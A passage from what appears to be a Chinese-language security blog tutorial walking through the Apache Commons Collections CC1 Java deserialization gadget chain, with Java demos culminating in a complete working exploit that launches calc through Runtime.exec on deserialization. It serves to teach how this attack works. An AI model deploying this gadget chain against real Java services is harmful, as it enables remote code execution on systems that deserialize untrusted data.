src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118190615.png"></p><blockquote><p>TransformedMap.decorate⽅法,预期是对Map类的数据结构进⾏转化，该⽅法有三个参数</p><p>第⼀个参数为待转化的Map对象 </p><p>第⼆个参数为Map对象内的key要经过的转化⽅法（可为单个⽅法，也可为链，也可为空）</p><p>第三个参数为Map对象内的value要经过的转化⽅法</p></blockquote><h5 id="Map的其他知识"><a href="#Map的其他知识" class="headerlink" title="Map的其他知识"></a>Map的其他知识</h5><ul><li>Map是java中的接⼝，Map.Entry是Map的⼀个内部接⼝。</li><li>Map提供了⼀些常⽤⽅法，如keySet()、entrySet()等⽅法。</li><li>keySet()⽅法返回值是Map中key值的集合；</li><li>entrySet()的返回值也是返回⼀个Set集合，此集合的类型为Map.Entry。</li><li>Map.Entry是Map声明的⼀个内部接⼝，此接⼝为泛型，定义为Entry。它表⽰Map中的⼀ 个实体（⼀个key-value对）。接⼝中有getKey(),getValue⽅法，可以⽤来对集合中的元素进⾏ 修改</li></ul><h4 id="Transform接口"><a href="#Transform接口" class="headerlink" title="Transform接口"></a>Transform接口</h4><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>作用：得到 class 对象</p><p>class.forName()</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118192316.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> constantTransformer.transform(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        System.out.println(transform);</span><br><span class="line">        System.out.println(transform.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119135014.png"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>作用：接⼝于Transformer的类都具备把⼀个对象转化为另⼀个对象的功能</p><p>先看一下它最常用的构造方法，可以看到需要传递三个参数</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119135519.png"></p><p>再看一下它的<code>transform</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118191555.png"></p><p>我们可以看到该类接收⼀个对象，获取该对象的名称，然后调⽤了⼀个invoke⽅法传递参数。另外，多 个Transformer还能串起来，形成ChainedTransformer。当触发时，ChainedTransformer可以按顺 序调⽤⼀系列的变换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义需要执⾏的本地系统命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="comment">// 构建transformer对象</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 传⼊Runtime实例，执⾏对象转换操作</span></span><br><span class="line">        transformer.transform(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>当传⼊的参数是⼀个数组的时候，就开始循环读取，对每个参数调⽤ transform ⽅法,从⽽构造出 ⼀条链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调⽤链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 执⾏对象转换操作</span></span><br><span class="line">        transformedChain.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>于是，我们的思路环境就出来了</p><ol><li>ConstantTransformer –&gt; 把⼀个对象转换为常量，并返回  -&gt;获取到了Runtime.class</li><li>InvokerTransformer –&gt; 通过反射，返回⼀个对象 -&gt; 反射获取执行方法加入参数</li><li>ChainedTransformer –&gt;执⾏链式的Transformer⽅法 -&gt;将反射包含的数组进行链式调用，从而连贯起来</li></ol><p>当然，这里所调用的每个类自然也是继承了<code>Serializable</code>接口，例如，</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119140006.png"></p><p>整体思路还是和上节课反射一样，仔细捋一下。上节课我们也提到过最后用数组包含起来传值的思路，这样是不是就理清了很多。</p><h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p>通过上面的几个例子，我们应该可以明白，最终是需要调用<code>transform</code>方法，才能完成我们最后一步。</p><p>但是，问题就来了：</p><ol><li>如何传入恶意的<code>ChainedTransformer</code>；</li><li>如何调用<code>transform</code>方法执行本地命令；</li></ol><p>压力就给到了如何调用<code>ChainedTransformer</code></p><p>但是我们看一下由工具<code>ysoserial </code>构造的payload</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119175804.png"></p><p><code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了java.util.Map接口，同时支持对Map的key或者value进行Transformer转换，调用decorate和decorateTransform方法就可以创建一个TransformedMap:</p><p>关键代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Transformer实现类分别    绑定到map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法。</p><p><strong>我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时（调用<code>TransformedMap</code>的<code>setValue/put/putAll</code>中的任意方法），就会自动触发<code>chainedtransformer</code>。</strong></p><p>所以，我们的demo’可以如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调⽤链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//创建Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 使⽤TransformedMap创建⼀个含有恶意调⽤链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>,</span><br><span class="line">                transformedChain);</span><br><span class="line">    <span class="comment">// transformedMap.put(&quot;v1&quot;, &quot;v2&quot;);// 执⾏put也会触发transform</span></span><br><span class="line">    <span class="comment">// 遍历Map元素，并调⽤setValue⽅法</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : transformedMap.entrySet()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">    <span class="comment">// setValue最终调⽤到InvokerTransformer的transform⽅法,从⽽触发Runtime命令执⾏调⽤链</span></span><br><span class="line">            entry.setValue(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            System.out.println(transformedMap);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们就来总结一下使用<code>TransformedMap</code>的条件</p><ol><li>实现了<code>java.io.Serializable</code>接口；</li><li>并且可以传入我们构建的<code>TransformedMap</code>对象；</li><li>调用了<code>TransformedMap</code>中的<code>setValue/put/putAll</code>中的任意方法一个方法的类；</li></ol><h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>在<code>AnnotationInvocationHandler</code>中 &#x3D;&#x3D;invoke&#x3D;&#x3D;方法都调用了get方法参数可控，&#x3D;&#x3D;readObject&#x3D;&#x3D;方法中满足<code>setValue()</code>进行<code>transform</code>执行</p><p>这里以<code>readObject</code>做例子</p><blockquote><p>这里的<code>readObject</code>是AnnotationInvocationHandler中的——&gt;具体参考java的多态性质</p></blockquote><blockquote><p>sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，是用来处理注解的一个类。它还重写了readObject方法，在readObject方法中间接的调用了TransformedMap中MapEntry的setValue方法，从而也就触发了transform方法，完成了整个攻击链的调用。</p></blockquote><p>我调了一下，调用堆栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">428</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">82</span>, Demo05 (com.CC1)</span><br></pre></td></tr></table></figure><p>可以看到,调用了<code>setValue()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220119194427.png"></p><blockquote><p>上图中的第352行中的memberValues是AnnotationInvocationHandler的成员变量，memberValues的值是在var1.defaultReadObject();时反序列化生成的，它也就是我们在创建AnnotationInvocationHandler时传入的带有恶意攻击链的TransformedMap。需要注意的是如果我们想要进入到var5.setValue这个逻辑那么我们的序列化的map中的key必须包含创建AnnotationInvocationHandler时传入的注解的方法名。</p></blockquote><p>于是，我们修改后完整的过程如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置构造方法的访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：</span></span><br><span class="line">            <span class="comment">// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建用于存储payload的二进制输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Java对象序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化AnnotationInvocationHandler类</span></span><br><span class="line">            out.writeObject(instance);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取序列化的二进制数组</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出序列化的二进制数组</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Payload攻击字节数组：&quot;</span> + Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟远程的反序列化过程</span></span><br><span class="line">            in.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭ObjectInputStream输入流</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LazyMap"><a href="#LazyMap" class="headerlink" 